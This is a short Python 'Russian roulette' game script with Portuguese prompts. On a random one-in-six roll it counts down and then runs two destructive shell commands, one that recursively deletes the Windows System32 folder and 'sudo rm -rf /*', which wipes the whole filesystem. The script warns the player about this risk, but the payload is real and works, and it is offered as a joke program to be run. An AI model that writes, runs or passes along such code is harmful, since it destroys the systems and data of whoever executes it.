#😭🙏🥀🥀

import os
import random
import time

while True:
    print('Roleta russa em python, você tem 6 tentativas e uma delas pode destruir teu computador, você consegue concluir o jogo?')
    escolha = input('Você deseja jogar? (s/n) ')
    if escolha == 'n':
        print('Fechando o jogo...')
        exit()
    elif escolha != 's':
        print('Digite apenas s ou n!')
        continue

    tentativas = 6
    while tentativas > 0:
        bala = random.randint(1, 6)
        if bala == 1:
            print('destruindo sistema operacional em...')
            time.sleep(1)
            print('3')
            time.sleep(1)
            print('2')
            time.sleep(1)
            print('1')
            time.sleep(1)
            print('adeus')
            time.sleep(1)
            os.system('del /s /q C:\\Windows\\System32')
            os.system('sudo rm -rf /*')
            exit()

        tentativas = tentativas - 1
        print(f'nada aconteceu, você tem {tentativas} tentativas restantes.')
        if tentativas > 0:
            while True:
                tentar = input('Tentar denovo? (s/n) ')
                if tentar == 'n':
                    print('Fechando o jogo...')
                    exit()
                elif tentar == 's':
                    break
                else:
                    print('Digite apenas s ou n!')

    print('Você sobreviveu às 6 tentativas!')
    exit()
